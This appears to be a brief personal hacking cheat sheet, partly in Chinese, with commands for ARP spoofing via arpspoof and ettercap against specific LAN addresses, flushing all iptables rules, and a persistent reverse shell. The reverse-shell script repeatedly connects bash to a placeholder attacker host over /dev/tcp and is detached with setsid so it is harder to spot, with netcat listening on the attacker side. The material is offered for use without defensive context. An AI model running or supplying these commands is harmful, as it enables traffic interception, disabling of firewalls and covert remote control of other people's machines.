# arp

## arpspoof
1. install
```shell
apt install dsniff
```
2. 开启IP转发
```shell
# Linux root user
echo 1 >/proc/sys/net/ipv4/ip_forward
```
3. 查看IP转发
```shell
sudo sysctl -a | grep forward
```

## ettercap
```shell
# arp spoof
sudo ettercap -T -M arp /192.168.31.1// /192.168.31.68//
#
sudo ettercap -T -M arp:remote /192.168.31.1// /192.168.31.68//
```

## driftnet
## upx
## od

# iptables

## 删除所有iptables规则
```shell
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT
iptables -t nat -F
iptables -t mangle -F
iptables -F
iptables -X
```

## 显示规则
```shell
sudo iptables -t nat -v -L -n --line-number # 显示iptables规则
```

# reverse shell

    启用tcp连接主机，每隔10秒连接一次。当主机开启监听就直接向靶机发送指令。
    主机不在连接中，靶机上也看不到tcp信息，但是能看到进程信息。
    所以要将启动的进程的父进程设置为init(1)，用setsid命令将程序执行启动
1. 在靶机上启动反向shell

    创建如下文件reverse_shell.sh
```shell
#!/bin/bash

while true;do bash -i 2>/dev/null &> /dev/tcp/attack_IP/attack_port 0>&1;sleep 10; done;
```
    启动该程序
```shell
setsid reverse_shell.sh
```

2. 在攻击机器上接收
```shell
nc -lvp attack_port
```